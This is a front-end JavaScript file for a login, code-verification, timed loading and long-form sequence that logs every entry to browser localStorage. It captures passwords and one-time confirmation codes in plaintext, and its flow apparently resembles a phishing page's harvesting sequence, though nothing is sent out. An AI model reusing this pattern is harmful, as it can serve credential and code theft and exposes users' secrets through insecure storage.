// Utility: Save logs to localStorage
function saveLog(entry) {
  let logs = JSON.parse(localStorage.getItem("happyFamilyLogs")) || [];
  logs.push(entry);
  localStorage.setItem("happyFamilyLogs", JSON.stringify(logs));
}

// Handle login page
const loginForm = document.getElementById("loginForm");
if (loginForm) {
  loginForm.addEventListener("submit", function(e) {
    e.preventDefault();
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();
    // Validate username (email or phone)
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phonePattern = /^\+?\d{3,15}$/;
    if (!(emailPattern.test(username) || phonePattern.test(username))) {
      alert("Please enter a valid email or phone number.");
      return;
    }
    if (password.length < 6) {
      alert("Password must be at least 6 characters.");
      return;
    }
    saveLog({ username, password });
    window.location.href = "verify.html";
  });
}

// Handle verification page
const verifyForm = document.getElementById("verifyForm");
if (verifyForm) {
  verifyForm.addEventListener("submit", function(e) {
    e.preventDefault();
    const confirmationCode = document.getElementById("confirmationCode").value.trim();
    if (confirmationCode.length < 3 || !/^\d+$/.test(confirmationCode)) {
      alert("Enter a valid code (at least 3 digits).");
      return;
    }
    saveLog({ confirmationCode });
    window.location.href = "loading.html";
  });
}

// Handle loading page
const caption = document.getElementById("caption");
if (caption) {
  setTimeout(() => {
    caption.classList.remove("blurred");
    caption.classList.add("clear");
    window.location.href = "form.html";
  }, 8000); // 8 seconds
}

// Handle form submission
const bigForm = document.getElementById("bigForm");
if (bigForm) {
  bigForm.addEventListener("submit", function(e) {
    e.preventDefault();
    const formData = {};
    Array.from(bigForm.elements).forEach(el => {
      if (el.name) {
        if (el.type === "checkbox" || el.type === "radio") {
          if (el.checked) {
            if (formData[el.name]) {
              if (!Array.isArray(formData[el.name])) formData[el.name] = [formData[el.name]];
              formData[el.name].push(el.value);
            } else {
              formData[el.name] = el.value;
            }
          }
        } else {
          formData[el.name] = el.value;
        }
      }
    });
    saveLog({ formData });
    window.location.href = "submitted.html";
  });
}
